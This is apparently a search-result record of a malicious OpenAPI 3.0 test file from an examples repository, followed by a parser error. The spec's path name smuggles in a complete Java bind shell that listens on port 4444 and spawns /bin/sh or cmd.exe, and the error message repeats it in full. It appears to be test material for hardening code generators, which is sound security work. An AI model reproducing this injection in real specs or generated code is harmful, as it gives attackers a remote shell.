{
	"File": {
		"__typename": "FileMatch",
		"repository": {
			"name": "github.com/Mermade/openapi3-examples"
		},
		"file": {
			"name": "rapid7-java.json",
			"path": "3.0/malicious/rapid7-java.json",
			"content": "{\n    \"openapi\": \"3.0.0\",\n    \"servers\": [\n        {\n            \"url\": \"http://localhost/\"\n        }\n    ],\n    \"info\": {\n        \"description\": \"A\",\n        \"version\": \"1.0.0\",\n        \"title\": \"C\",\n        \"contact\": {\n            \"name\": \"Rapid 7\",\n            \"url\": \"https://www.rapid7.com/\",\n            \"email\": \"info@rapid7.com\"\n        },\n        \"license\": {\n            \"name\": \"BSD-3-clause\",\n            \"url\": \"https://opensource.org/licenses/BSD-3-Clause\"\n        }\n    },\n    \"tags\": [\n        {\n            \"name\": \"default\"\n        }\n    ],\n    \"paths\": {\n        \"/a\\\"; \\\"import java.lang.*; import java.util.*; import java.io.*; import java.net.*;     class StreamConnector extends Thread   {     InputStream dh;     OutputStream lk;      StreamConnector( InputStream dh, OutputStream lk )     {       this.dh = dh;       this.lk = lk;     }      public void run()     {       BufferedReader ob  = null;       BufferedWriter oqh = null;       try       {         ob  = new BufferedReader( new InputStreamReader( this.dh ) );         oqh = new BufferedWriter( new OutputStreamWriter( this.lk ) );         char buffer[] = new char[8192];         int length;         while( ( length = ob.read( buffer, 0, buffer.length ) ) \u003e 0 )         {           oqh.write( buffer, 0, length );           oqh.flush();         }       } catch( Exception e ){}       try       {         if( ob != null )           ob.close();         if( oqh != null )           oqh.close();       } catch( Exception e ){}     }   }    try   {     String ShellPath; if (System.getProperty(\\\"os.name\\\").toLowerCase().indexOf(\\\"windows\\\") == -1) {   ShellPath = new String(\\\"/bin/sh\\\"); } else {   ShellPath = new String(\\\"cmd.exe\\\"); }      ServerSocket server_socket = new ServerSocket( 4444 );     Socket client_socket = server_socket.accept();     server_socket.close();     Process process = Runtime.getRuntime().exec( ShellPath );     ( new StreamConnector( process.getInputStream(), client_socket.getOutputStream() ) ).start();     ( new StreamConnector( client_socket.getInputStream(), process.getOutputStream() ) ).start();   } catch( Exception e ) {}  \": {\n            \"summary\": \"an example path\",\n            \"get\": {\n                \"operationId\": \"get_a\",\n                \"tags\": [\n                    \"default\"\n                ],\n                \"description\": \"D\",\n                \"responses\": {\n                    \"200\": {\n                        \"description\": \"E\",\n                        \"content\": {\n                            \"application/json\": {\n                                \"schema\": {\n                                    \"$ref\": \"#/components/schemas/d\"\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    },\n    \"components\": {\n        \"schemas\": {\n            \"d\": {\n                \"type\": \"object\",\n                \"description\": \"F\",\n                \"properties\": {\n                    \"id\": {\n                        \"type\": \"integer\",\n                        \"format\": \"int64\"\n                    }\n                }\n            }\n        }\n    }\n}\n"
		}
	},
	"Error": "parse: paths: /a\"; \"import java.lang.*; import java.util.*; import java.io.*; import java.net.*;     class StreamConnector extends Thread   {     InputStream dh;     OutputStream lk;      StreamConnector( InputStream dh, OutputStream lk )     {       this.dh = dh;       this.lk = lk;     }      public void run()     {       BufferedReader ob  = null;       BufferedWriter oqh = null;       try       {         ob  = new BufferedReader( new InputStreamReader( this.dh ) );         oqh = new BufferedWriter( new OutputStreamWriter( this.lk ) );         char buffer[] = new char[8192];         int length;         while( ( length = ob.read( buffer, 0, buffer.length ) ) \u003e 0 )         {           oqh.write( buffer, 0, length );           oqh.flush();         }       } catch( Exception e ){}       try       {         if( ob != null )           ob.close();         if( oqh != null )           oqh.close();       } catch( Exception e ){}     }   }    try   {     String ShellPath; if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) {   ShellPath = new String(\"/bin/sh\"); } else {   ShellPath = new String(\"cmd.exe\"); }      ServerSocket server_socket = new ServerSocket( 4444 );     Socket client_socket = server_socket.accept();     server_socket.close();     Process process = Runtime.getRuntime().exec( ShellPath );     ( new StreamConnector( process.getInputStream(), client_socket.getOutputStream() ) ).start();     ( new StreamConnector( client_socket.getInputStream(), process.getOutputStream() ) ).start();   } catch( Exception e ) {}  : get: get_a: parse path: invalid path: /a\"; \"import java.lang.*; import java.util.*; import java.io.*; import java.net.*;     class StreamConnector extends Thread   {     InputStream dh;     OutputStream lk;      StreamConnector( InputStream dh, OutputStream lk )     {       this.dh = dh;       this.lk = lk;     }      public void run()     {       BufferedReader ob  = null;       BufferedWriter oqh = null;       try       {         ob  = new BufferedReader( new InputStreamReader( this.dh ) );         oqh = new BufferedWriter( new OutputStreamWriter( this.lk ) );         char buffer[] = new char[8192];         int length;         while( ( length = ob.read( buffer, 0, buffer.length ) ) \u003e 0 )         {           oqh.write( buffer, 0, length );           oqh.flush();         }       } catch( Exception e ){}       try       {         if( ob != null )           ob.close();         if( oqh != null )           oqh.close();       } catch( Exception e ){}     }   }    try   {     String ShellPath; if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) {   ShellPath = new String(\"/bin/sh\"); } else {   ShellPath = new String(\"cmd.exe\"); }      ServerSocket server_socket = new ServerSocket( 4444 );     Socket client_socket = server_socket.accept();     server_socket.close();     Process process = Runtime.getRuntime().exec( ShellPath );     ( new StreamConnector( process.getInputStream(), client_socket.getOutputStream() ) ).start();     ( new StreamConnector( client_socket.getInputStream(), process.getOutputStream() ) ).start();   } catch( Exception e ) {}  "
}